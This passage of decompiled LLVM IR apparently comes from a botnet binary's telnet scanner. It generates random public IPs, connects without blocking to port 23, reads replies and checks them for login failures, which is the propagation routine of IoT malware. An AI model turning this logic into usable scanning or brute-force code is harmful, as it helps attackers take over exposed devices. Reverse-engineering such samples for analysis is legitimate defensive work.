  %v1_804a25c = add i32 %v0_804a25c, 4
  store i32 %v1_804a25c, i32* %eax.global-to-local, align 4
  %v0_804a25f = load i32, i32* %edx.global-to-local, align 4
  %v2_804a25f = inttoptr i32 %v1_804a25c to i32*
  store i32 %v0_804a25f, i32* %v2_804a25f, align 4
  %v0_804a261 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a261 = add i32 %v0_804a261, 4
  store i32 %v1_804a261, i32* %eax.global-to-local, align 4
  %v0_804a264 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a264 = inttoptr i32 %v1_804a261 to i32*
  store i32 %v0_804a264, i32* %v2_804a264, align 4
  %v0_804a266 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a266 = add i32 %v0_804a266, 4
  store i32 %v1_804a266, i32* %eax.global-to-local, align 4
  %v0_804a269 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a269 = inttoptr i32 %v1_804a266 to i32*
  store i32 %v0_804a269, i32* %v2_804a269, align 4
  %v0_804a26b = load i32, i32* %eax.global-to-local, align 4
  %v1_804a26b = add i32 %v0_804a26b, 4
  %v0_804a26e = load i32, i32* %edx.global-to-local, align 4
  %v2_804a26e = inttoptr i32 %v1_804a26b to i32*
  store i32 %v0_804a26e, i32* %v2_804a26e, align 4
  store i32 %v1_804a22a, i32* %edx.global-to-local, align 4
  store i32 %v2_804a22d, i32* @eax, align 4
  store i32 %v2_804a22d, i32* %v1_804a22d, align 4
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804a293 = call i32 @GetRandomPublicIP(i32 %v6_804a1c3)
  %v0_804a29d = load i32, i32* @ebx, align 4
  %v1_804a29f = mul i32 %v0_804a29d, 4
  store i32 %v1_804a29f, i32* %edx.global-to-local, align 4
  %v2_804a2ad = mul i32 %v0_804a29d, 28
  %v2_804a2af = add i32 %v2_804a2ad, %v2_804a07d
  %v1_804a2b1 = add i32 %v2_804a2af, 4
  store i32 %v1_804a2b1, i32* %eax.global-to-local, align 4
  %v2_804a2b4 = inttoptr i32 %v1_804a2b1 to i32*
  store i32 %v1_804a293, i32* %v2_804a2b4, align 4
  br label %dec_label_pc_804a38f

dec_label_pc_804a2bb:                             ; preds = %dec_label_pc_804a1f0
  %v5_804a2d1 = load i8, i8* %v4_804a206, align 1
  %v6_804a2d1 = zext i8 %v5_804a2d1 to i32
  %v9_804a2d1 = or i32 %v6_804a2d1, %v8_804a1c3
  store i32 %v9_804a2d1, i32* %eax.global-to-local, align 4
  %v4_804a2d5 = icmp eq i8 %v5_804a2d1, 0
  %v1_804a2d7 = icmp eq i1 %v4_804a2d5, false
  br i1 %v1_804a2d7, label %dec_label_pc_804a38f, label %dec_label_pc_804a2dd

dec_label_pc_804a2dd:                             ; preds = %dec_label_pc_804a2bb
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a2f5 = add i32 %v2_804a2f5, %v2_804a172
  %v4_804a2f5 = inttoptr i32 %v3_804a2f5 to i8*
  %v5_804a2f5 = load i8, i8* %v4_804a2f5, align 1
  %v1_804a2f9 = add i8 %v5_804a2f5, 1
  store i8 %v1_804a2f9, i8* %v4_804a2f5, align 1
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a32f = add i32 %v2_804a32f, %v2_804a172
  %v4_804a32f = inttoptr i32 %v3_804a32f to i8*
  %v5_804a32f = load i8, i8* %v4_804a32f, align 2
  %v6_804a32f = zext i8 %v5_804a32f to i32
  %v9_804a32f = or i32 %v6_804a32f, %v8_804a1c3
  %v1_804a333 = add i32 %v9_804a32f, 1
  store i32 %v1_804a333, i32* @esi, align 4
  %v1_804a34d = trunc i32 %v1_804a333 to i8
  store i8 %v1_804a34d, i8* %v4_804a32f, align 2
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v5_804a367 = load i8, i8* %v4_804a32f, align 2
  %v6_804a367 = zext i8 %v5_804a367 to i32
  %v9_804a367 = or i32 %v6_804a367, %v8_804a1c3
  store i32 %v9_804a367, i32* %eax.global-to-local, align 4
  %v10_804a36b = icmp eq i8 %v5_804a367, 9
  %v1_804a36d = icmp eq i1 %v10_804a36b, false
  br i1 %v1_804a36d, label %dec_label_pc_804a38f, label %dec_label_pc_804a36f

dec_label_pc_804a36f:                             ; preds = %dec_label_pc_804a2dd
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a206, align 1
  br label %dec_label_pc_804b063

dec_label_pc_804a38f:                             ; preds = %dec_label_pc_804a2dd, %dec_label_pc_804a2bb, %dec_label_pc_804a212
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804a398 = load i32, i32* @esp, align 4
  %v1_804a39b = add i32 %v0_804a398, -16
  %v2_804a39b = inttoptr i32 %v1_804a39b to i32*
  store i32 23, i32* %v2_804a39b, align 4
  %v0_804a39d = load i32, i32* %stack_var_-604, align 4
  %v1_804a39d = call i32 @htons(i32 %v0_804a39d)
  %v0_804a3a2 = load i32, i32* @esp, align 4
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  %v1_804a3da = add i32 %v2_804a174, 4
  store i32 %v1_804a3da, i32* %eax.global-to-local, align 4
  %v1_804a3dd = inttoptr i32 %v1_804a3da to i32*
  %v2_804a3dd = load i32, i32* %v1_804a3dd, align 4
  store i32 %v2_804a3dd, i32* %eax.global-to-local, align 4
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804a3eb = add i32 %v0_804a3a2, 8
  %v2_804a3eb = inttoptr i32 %v1_804a3eb to i32*
  store i32 0, i32* %v2_804a3eb, align 4
  %v1_804a3ed = add i32 %v0_804a3a2, 4
  %v2_804a3ed = inttoptr i32 %v1_804a3ed to i32*
  store i32 1, i32* %v2_804a3ed, align 4
  %v2_804a3ef = inttoptr i32 %v0_804a3a2 to i32*
  store i32 2, i32* %v2_804a3ef, align 4
  %v2_804a3f1 = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v1_804a39d, 65536
  %v3_804a3f1 = sdiv i32 %sext, 65536
  %v4_804a3f1 = call i32 @socket(i32 %v3_804a3f1, i32 %v2_804a3dd, i32 %v2_804a3f1)
  store i32 %v4_804a3f1, i32* @esi, align 4
  %v0_804a3fe = load i32, i32* @ebx, align 4
  %v2_804a40e = mul i32 %v0_804a3fe, 28
  %v3_804a410 = add i32 %v2_804a40e, %v2_804a07d
  %v4_804a410 = inttoptr i32 %v3_804a410 to i32*
  store i32 %v4_804a3f1, i32* %v4_804a410, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a429 = inttoptr i32 %v2_804a174 to i32*
  %v4_804a429 = load i32, i32* %v3_804a429, align 4
  store i32 %v4_804a429, i32* %eax.global-to-local, align 4
  %v10_804a42c = icmp eq i32 %v4_804a429, -1
  br i1 %v10_804a42c, label %dec_label_pc_804b063, label %dec_label_pc_804a435

dec_label_pc_804a435:                             ; preds = %dec_label_pc_804a38f
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a44b = load i32, i32* %v3_804a429, align 4
  store i32 %v4_804a44b, i32* %eax.global-to-local, align 4
  %v0_804a44e = load i32, i32* @esp, align 4
  %v1_804a451 = add i32 %v0_804a44e, -8
  %v2_804a451 = inttoptr i32 %v1_804a451 to i32*
  store i32 0, i32* %v2_804a451, align 4
  %v1_804a453 = add i32 %v0_804a44e, -12
  %v2_804a453 = inttoptr i32 %v1_804a453 to i32*
  store i32 3, i32* %v2_804a453, align 4
  %v0_804a455 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a455 = add i32 %v0_804a44e, -16
  %v3_804a455 = inttoptr i32 %v2_804a455 to i32*
  store i32 %v0_804a455, i32* %v3_804a455, align 4
  %v1_804a456 = load i32, i32* %stack_var_-596, align 4
  %v3_804a456 = call i32 @__libc_fcntl(i32 %v2_804a3dd, i32 %v1_804a456, i32 0)
  %v0_804a45b = load i32, i32* @esp, align 4
  %v12_804a460 = or i32 %v3_804a456, 2048
  store i32 %v12_804a460, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a479 = load i32, i32* %v3_804a429, align 4
  store i32 %v4_804a479, i32* %eax.global-to-local, align 4
  %v2_804a47f = add i32 %v0_804a45b, 8
  %v3_804a47f = inttoptr i32 %v2_804a47f to i32*
  store i32 %v12_804a460, i32* %v3_804a47f, align 4
  %v1_804a480 = add i32 %v0_804a45b, 4
  %v2_804a480 = inttoptr i32 %v1_804a480 to i32*
  store i32 4, i32* %v2_804a480, align 4
  %v0_804a482 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a482 = inttoptr i32 %v0_804a45b to i32*
  store i32 %v0_804a482, i32* %v3_804a482, align 4
  %v1_804a483 = load i32, i32* %stack_var_-596, align 4
  %v3_804a483 = call i32 @__libc_fcntl(i32 %v2_804a3dd, i32 %v1_804a483, i32 0)
  %v0_804a488 = load i32, i32* @esp, align 4
  store i32 %v2_804a00b, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a4a7 = load i32, i32* %v3_804a429, align 4
  store i32 %v4_804a4a7, i32* %eax.global-to-local, align 4
  %v1_804a4ad = add i32 %v0_804a488, 8
  %v2_804a4ad = inttoptr i32 %v1_804a4ad to i32*
  store i32 16, i32* %v2_804a4ad, align 4
  %v2_804a4af = add i32 %v0_804a488, 4
  %v3_804a4af = inttoptr i32 %v2_804a4af to i32*
  store i32 %v2_804a00b, i32* %v3_804a4af, align 4
  %v0_804a4b0 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a4b0 = inttoptr i32 %v0_804a488 to i32*
  store i32 %v0_804a4b0, i32* %v3_804a4b0, align 4
  %v1_804a4b1 = load i32, i32* %stack_var_-596, align 4
  %v3_804a4b1 = call i32 @__libc_connect(i32 %v2_804a3dd, i32 %v1_804a4b1, i32 0)
  store i32 %v3_804a4b1, i32* %eax.global-to-local, align 4
  %v0_804a4b6 = load i32, i32* @esp, align 4
  %v1_804a4b6 = add i32 %v0_804a4b6, 16
  %v10_804a4b9 = icmp eq i32 %v3_804a4b1, -1
  %v1_804a4bc = icmp eq i1 %v10_804a4b9, false
  br i1 %v1_804a4bc, label %dec_label_pc_804a4f4, label %dec_label_pc_804a4be

dec_label_pc_804a4be:                             ; preds = %dec_label_pc_804a435
  %v1_804a4be = call i32 @__errno_location(i32 %v2_804a3dd)
  store i32 %v1_804a4be, i32* %eax.global-to-local, align 4
  %v1_804a4c3 = inttoptr i32 %v1_804a4be to i32*
  %v2_804a4c3 = load i32, i32* %v1_804a4c3, align 4
  store i32 %v2_804a4c3, i32* %eax.global-to-local, align 4
  %v9_804a4c5 = icmp eq i32 %v2_804a4c3, 115
  br i1 %v9_804a4c5, label %dec_label_pc_804a4be.dec_label_pc_804a4f4_crit_edge, label %dec_label_pc_804a4ca

dec_label_pc_804a4be.dec_label_pc_804a4f4_crit_edge: ; preds = %dec_label_pc_804a4be
  %v0_804a50d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a4f4

dec_label_pc_804a4ca:                             ; preds = %dec_label_pc_804a4be
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v0_804a4e3 = load i32, i32* @esp, align 4
  %v2_804a4e6 = add i32 %v0_804a4e3, -16
  %v3_804a4e6 = inttoptr i32 %v2_804a4e6 to i32*
  store i32 %v2_804a174, i32* %v3_804a4e6, align 4
  %v1_804a4e7 = call i32 @reset_telstate(i32 %v2_804a3dd)
  store i32 %v1_804a4e7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a4f4:                             ; preds = %dec_label_pc_804a4be.dec_label_pc_804a4f4_crit_edge, %dec_label_pc_804a435
  %v0_804a50d = phi i32 [ %v0_804a50d.pre, %dec_label_pc_804a4be.dec_label_pc_804a4f4_crit_edge ], [ %v1_804a4b6, %dec_label_pc_804a435 ]
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804a510 = add i32 %v0_804a50d, -12
  %v2_804a510 = inttoptr i32 %v1_804a510 to i32*
  store i32 1, i32* %v2_804a510, align 4
  %v0_804a512 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a512 = add i32 %v0_804a50d, -16
  %v3_804a512 = inttoptr i32 %v2_804a512 to i32*
  store i32 %v0_804a512, i32* %v3_804a512, align 4
  %v1_804a513 = load i32, i32* %stack_var_-596, align 4
  %v2_804a513 = inttoptr i32 %v2_804a3dd to i32*
  %v3_804a513 = call i32 @advance_state(i32* %v2_804a513, i32 %v1_804a513)
  store i32 %v3_804a513, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a520:                             ; preds = %dec_label_pc_804a1ad
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a52a, i32* @edi, align 4
  %v5_804a531 = call i8* @_memset(i8* %tmp38, i32 0, i32 32)
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a54f = inttoptr i32 %v2_804a174 to i32*
  %v4_804a54f = load i32, i32* %v3_804a54f, align 4
  %v2_804a554 = udiv i32 %v4_804a54f, 32
  store i32 %v2_804a554, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a56d = load i32, i32* %v3_804a54f, align 4
  %v1_804a570 = urem i32 %v4_804a56d, 32
  store i32 %v1_804a570, i32* %eax.global-to-local, align 4
  %v0_804a573 = load i32, i32* @ebp, align 4
  %v2_804a573 = mul nuw nsw i32 %v2_804a554, 4
  %v3_804a573 = add nsw i32 %v2_804a573, -312
  %v4_804a573 = add i32 %v3_804a573, %v0_804a573
  %v5_804a573 = inttoptr i32 %v4_804a573 to i32*
  %v6_804a573 = load i32, i32* %v5_804a573, align 4
  %v9_804a573 = shl i32 1, %v1_804a570
  %v12_804a573 = or i32 %v6_804a573, %v9_804a573
  store i32 %v12_804a573, i32* %v5_804a573, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a5a4 = load i32, i32* %v3_804a54f, align 4
  %v1_804a5a7 = add i32 %v4_804a5a4, 1
  store i32 %v1_804a5a7, i32* %edx.global-to-local, align 4
  %v0_804a5aa = load i32, i32* @esp, align 4
  %v2_804a5b3 = add i32 %v0_804a5aa, -16
  %v3_804a5b3 = inttoptr i32 %v2_804a5b3 to i32*
  store i32 %v2_804a5ad, i32* %v3_804a5b3, align 4
  %v1_804a5b4 = add i32 %v0_804a5aa, -20
  %v2_804a5b4 = inttoptr i32 %v1_804a5b4 to i32*
  store i32 0, i32* %v2_804a5b4, align 4
  store i32 %v2_804a52a, i32* %eax.global-to-local, align 4
  %v2_804a5bc = add i32 %v0_804a5aa, -24
  %v3_804a5bc = inttoptr i32 %v2_804a5bc to i32*
  store i32 %v2_804a52a, i32* %v3_804a5bc, align 4
  %v1_804a5bd = add i32 %v0_804a5aa, -28
  %v2_804a5bd = inttoptr i32 %v1_804a5bd to i32*
  store i32 0, i32* %v2_804a5bd, align 4
  %v0_804a5bf = load i32, i32* %edx.global-to-local, align 4
  %v2_804a5bf = add i32 %v0_804a5aa, -32
  %v3_804a5bf = inttoptr i32 %v2_804a5bf to i32*
  store i32 %v0_804a5bf, i32* %v3_804a5bf, align 4
  %v0_804a5c0 = load i32, i32* %stack_var_-324, align 4
  %v2_804a5c0 = load i32, i32* %stack_var_-316, align 4
  %v5_804a5c0 = call i32 @__libc_select(i32 %v0_804a5c0, i32 %arg1, i32 %v2_804a5c0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804a5c0, i32* %eax.global-to-local, align 4
  %v0_804a5c5 = load i32, i32* @esp, align 4
  %v12_804a5cb = icmp eq i32 %v5_804a5c0, 1
  %v1_804a5cf = icmp eq i1 %v12_804a5cb, false
  br i1 %v1_804a5cf, label %dec_label_pc_804a6d6, label %dec_label_pc_804a5d5

dec_label_pc_804a5d5:                             ; preds = %dec_label_pc_804a520
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a5ff = load i32, i32* %v3_804a54f, align 4
  store i32 %v4_804a5ff, i32* %edx.global-to-local, align 4
  %v2_804a60b = add i32 %v0_804a5c5, 16
  %v3_804a60b = inttoptr i32 %v2_804a60b to i32*
  store i32 %v2_804a605, i32* %v3_804a60b, align 4
  store i32 %v2_804a60c, i32* %eax.global-to-local, align 4
  %v2_804a612 = add i32 %v0_804a5c5, 12
  %v3_804a612 = inttoptr i32 %v2_804a612 to i32*
  store i32 %v2_804a60c, i32* %v3_804a612, align 4
  %v1_804a613 = add i32 %v0_804a5c5, 8
  %v2_804a613 = inttoptr i32 %v1_804a613 to i32*
  store i32 4, i32* %v2_804a613, align 4
  %v1_804a615 = add i32 %v0_804a5c5, 4
  %v2_804a615 = inttoptr i32 %v1_804a615 to i32*
  store i32 1, i32* %v2_804a615, align 4
  %v0_804a617 = load i32, i32* %edx.global-to-local, align 4
  %v3_804a617 = inttoptr i32 %v0_804a5c5 to i32*
  store i32 %v0_804a617, i32* %v3_804a617, align 4
  %v0_804a618 = load i32, i32* %stack_var_-332, align 4
  %v1_804a618 = load i32, i32* %stack_var_-328, align 4
  %v2_804a618 = load i32, i32* %stack_var_-324, align 4
  %v4_804a618 = load i32, i32* %stack_var_-316, align 4
  %v5_804a618 = call i32 @getsockopt(i32 %v0_804a618, i32 %v1_804a618, i32 %v2_804a618, i32 %arg1, i32 %v4_804a618)
  %v0_804a61d = load i32, i32* @esp, align 4
  %v3_804a620 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804a620, i32* %eax.global-to-local, align 4
  %v1_804a626 = icmp eq i32 %v3_804a620, 0
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804a626, label %dec_label_pc_804a654, label %dec_label_pc_804a62a

dec_label_pc_804a62a:                             ; preds = %dec_label_pc_804a5d5
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v2_804a646 = add i32 %v0_804a61d, 16
  %v3_804a646 = inttoptr i32 %v2_804a646 to i32*
  store i32 %v2_804a174, i32* %v3_804a646, align 4
  %v0_804a647 = load i32, i32* %stack_var_-332, align 4
  %v1_804a647 = call i32 @reset_telstate(i32 %v0_804a647)
  store i32 %v1_804a647, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a654:                             ; preds = %dec_label_pc_804a5d5
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a66a = load i32, i32* %v3_804a54f, align 4
  store i32 %v4_804a66a, i32* %eax.global-to-local, align 4
  %v1_804a670 = add i32 %v0_804a61d, 24
  %v2_804a670 = inttoptr i32 %v1_804a670 to i32*
  store i32 0, i32* %v2_804a670, align 4
  %v1_804a672 = add i32 %v0_804a61d, 20
  %v2_804a672 = inttoptr i32 %v1_804a672 to i32*
  store i32 3, i32* %v2_804a672, align 4
  %v0_804a674 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a674 = add i32 %v0_804a61d, 16
  %v3_804a674 = inttoptr i32 %v2_804a674 to i32*
  store i32 %v0_804a674, i32* %v3_804a674, align 4
  %v0_804a675 = load i32, i32* %stack_var_-332, align 4
  %v1_804a675 = load i32, i32* %stack_var_-328, align 4
  %v2_804a675 = load i32, i32* %stack_var_-324, align 4
  %v3_804a675 = call i32 @__libc_fcntl(i32 %v0_804a675, i32 %v1_804a675, i32 %v2_804a675)
  %v0_804a67a = load i32, i32* @esp, align 4
  %v13_804a67f = and i32 %v3_804a675, -2049
  store i32 %v13_804a67f, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a698 = load i32, i32* %v3_804a54f, align 4
  store i32 %v4_804a698, i32* %eax.global-to-local, align 4
  %v2_804a69e = add i32 %v0_804a67a, 8
  %v3_804a69e = inttoptr i32 %v2_804a69e to i32*
  store i32 %v13_804a67f, i32* %v3_804a69e, align 4
  %v1_804a69f = add i32 %v0_804a67a, 4
  %v2_804a69f = inttoptr i32 %v1_804a69f to i32*
  store i32 4, i32* %v2_804a69f, align 4
  %v0_804a6a1 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a6a1 = inttoptr i32 %v0_804a67a to i32*
  store i32 %v0_804a6a1, i32* %v3_804a6a1, align 4
  %v0_804a6a2 = load i32, i32* %stack_var_-332, align 4
  %v1_804a6a2 = load i32, i32* %stack_var_-328, align 4
  %v2_804a6a2 = load i32, i32* %stack_var_-324, align 4
  %v3_804a6a2 = call i32 @__libc_fcntl(i32 %v0_804a6a2, i32 %v1_804a6a2, i32 %v2_804a6a2)
  %v0_804a6a7 = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804a6c6 = add i32 %v0_804a6a7, 4
  %v2_804a6c6 = inttoptr i32 %v1_804a6c6 to i32*
  store i32 2, i32* %v2_804a6c6, align 4
  %v0_804a6c8 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a6c8 = inttoptr i32 %v0_804a6a7 to i32*
  store i32 %v0_804a6c8, i32* %v3_804a6c8, align 4
  %v0_804a6c9 = load i32, i32* %stack_var_-332, align 4
  %v1_804a6c9 = load i32, i32* %stack_var_-328, align 4
  %v2_804a6c9 = inttoptr i32 %v0_804a6c9 to i32*
  %v3_804a6c9 = call i32 @advance_state(i32* %v2_804a6c9, i32 %v1_804a6c9)
  store i32 %v3_804a6c9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a6d6:                             ; preds = %dec_label_pc_804a520
  %v13_804a6d6 = icmp eq i32 %v5_804a5c0, -1
  %v1_804a6da = icmp eq i1 %v13_804a6d6, false
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804a6da, label %dec_label_pc_804a706, label %dec_label_pc_804a6dc

dec_label_pc_804a6dc:                             ; preds = %dec_label_pc_804a6d6
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v2_804a6f8 = add i32 %v0_804a5c5, 16
  %v3_804a6f8 = inttoptr i32 %v2_804a6f8 to i32*
  store i32 %v2_804a174, i32* %v3_804a6f8, align 4
  %v1_804a6f9 = call i32 @reset_telstate(i32 %v5_804a5c0)
  store i32 %v1_804a6f9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a706:                             ; preds = %dec_label_pc_804a6d6
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v2_804a721 = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804a721, i32* %eax.global-to-local, align 4
  %v1_804a723 = add i32 %v2_804a721, 5
  store i32 %v1_804a723, i32* @ebx, align 4
  %v1_804a729 = add i32 %v0_804a5c5, 16
  %v2_804a729 = inttoptr i32 %v1_804a729 to i32*
  store i32 0, i32* %v2_804a729, align 4
  %v1_804a72b = inttoptr i32 %v5_804a5c0 to i32*
  %v2_804a72b = call i32 @__GI_time(i32* %v1_804a72b)
  store i32 %v2_804a72b, i32* %eax.global-to-local, align 4
  %v0_804a733 = load i32, i32* @ebx, align 4
  %v7_804a733 = icmp ult i32 %v0_804a733, %v2_804a72b
  %v1_804a735 = icmp eq i1 %v7_804a733, false
  br i1 %v1_804a735, label %dec_label_pc_804b063, label %dec_label_pc_804a73b

dec_label_pc_804a73b:                             ; preds = %dec_label_pc_804a706
  %v0_804a730 = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804a757 = inttoptr i32 %v0_804a730 to i32*
  store i32 %v2_804a174, i32* %v3_804a757, align 4
  %v0_804a758 = load i32, i32* %stack_var_-332, align 4
  %v1_804a758 = call i32 @reset_telstate(i32 %v0_804a758)
  store i32 %v1_804a758, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a765:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  %v1_804a77d = add i32 %v2_804a174, 24
  store i32 %v1_804a77d, i32* %eax.global-to-local, align 4
  %v1_804a780 = inttoptr i32 %v1_804a77d to i32*
  %v2_804a780 = load i32, i32* %v1_804a780, align 4
  store i32 %v2_804a780, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a798 = inttoptr i32 %v2_804a174 to i32*
  %v4_804a798 = load i32, i32* %v3_804a798, align 4
  store i32 %v4_804a798, i32* %eax.global-to-local, align 4
  %v0_804a79b = load i32, i32* @esp, align 4
  %v1_804a79e = add i32 %v0_804a79b, -16
  %v2_804a79e = inttoptr i32 %v1_804a79e to i32*
  store i32 134584268, i32* %v2_804a79e, align 4
  %v1_804a7a3 = add i32 %v0_804a79b, -20
  %v2_804a7a3 = inttoptr i32 %v1_804a7a3 to i32*
  store i32 1024, i32* %v2_804a7a3, align 4
  %v0_804a7a8 = load i32, i32* @ebx, align 4
  %v2_804a7a8 = add i32 %v0_804a79b, -24
  %v3_804a7a8 = inttoptr i32 %v2_804a7a8 to i32*
  store i32 %v0_804a7a8, i32* %v3_804a7a8, align 4
  %v5_804a7a9 = add i32 %v0_804a79b, -28
  %v6_804a7a9 = inttoptr i32 %v5_804a7a9 to i32*
  store i32 %arg1, i32* %v6_804a7a9, align 4
  %v0_804a7ac = load i32, i32* %eax.global-to-local, align 4
  %v2_804a7ac = add i32 %v0_804a79b, -32
  %v3_804a7ac = inttoptr i32 %v2_804a7ac to i32*
  store i32 %v0_804a7ac, i32* %v3_804a7ac, align 4
  %v1_804a7ad = call i32 @read_until_response(i32 %v6_804a1c3)
  %v0_804a7b2 = load i32, i32* @esp, align 4
  %v1_804a7b5 = icmp eq i32 %v1_804a7ad, 0
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  br i1 %v1_804a7b5, label %dec_label_pc_804a842, label %dec_label_pc_804a7bd

dec_label_pc_804a7bd:                             ; preds = %dec_label_pc_804a765
  store i32 %v1_804a77d, i32* %eax.global-to-local, align 4
  %v2_804a7d8 = load i32, i32* %v1_804a780, align 4
  store i32 %v2_804a7d8, i32* %eax.global-to-local, align 4
  %v2_804a7dd = add i32 %v0_804a7b2, 16
  %v3_804a7dd = inttoptr i32 %v2_804a7dd to i32*
  store i32 %v2_804a7d8, i32* %v3_804a7dd, align 4
  %v0_804a7de = load i32, i32* %stack_var_-332, align 4
  %v1_804a7de = call i32 @contains_fail(i32 %v0_804a7de)
  %v0_804a7e3 = load i32, i32* @esp, align 4
  %v1_804a7e6 = icmp eq i32 %v1_804a7de, 0
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804a832 = add i32 %v0_804a7e3, 4
  %v2_804a832 = inttoptr i32 %v1_804a832 to i32*
  br i1 %v1_804a7e6, label %dec_label_pc_804a816, label %dec_label_pc_804a7ea

dec_label_pc_804a7ea:                             ; preds = %dec_label_pc_804a7bd
  store i32 0, i32* %v2_804a832, align 4
  %v0_804a808 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a808 = inttoptr i32 %v0_804a7e3 to i32*
  store i32 %v0_804a808, i32* %v3_804a808, align 4
  %v0_804a809 = load i32, i32* %stack_var_-332, align 4
  %v1_804a809 = load i32, i32* %stack_var_-328, align 4
  %v2_804a809 = inttoptr i32 %v0_804a809 to i32*
  %v3_804a809 = call i32 @advance_state(i32* %v2_804a809, i32 %v1_804a809)
  store i32 %v3_804a809, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a816:                             ; preds = %dec_label_pc_804a7bd
  store i32 3, i32* %v2_804a832, align 4
  %v0_804a834 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a834 = inttoptr i32 %v0_804a7e3 to i32*
  store i32 %v0_804a834, i32* %v3_804a834, align 4
  %v0_804a835 = load i32, i32* %stack_var_-332, align 4
  %v1_804a835 = load i32, i32* %stack_var_-328, align 4
  %v2_804a835 = inttoptr i32 %v0_804a835 to i32*
  %v3_804a835 = call i32 @advance_state(i32* %v2_804a835, i32 %v1_804a835)
  store i32 %v3_804a835, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a842:                             ; preds = %dec_label_pc_804a765
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v2_804a85d = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804a85d, i32* %eax.global-to-local, align 4
  %v1_804a85f = add i32 %v2_804a85d, 7
  store i32 %v1_804a85f, i32* @ebx, align 4
  %v1_804a865 = add i32 %v0_804a7b2, 16
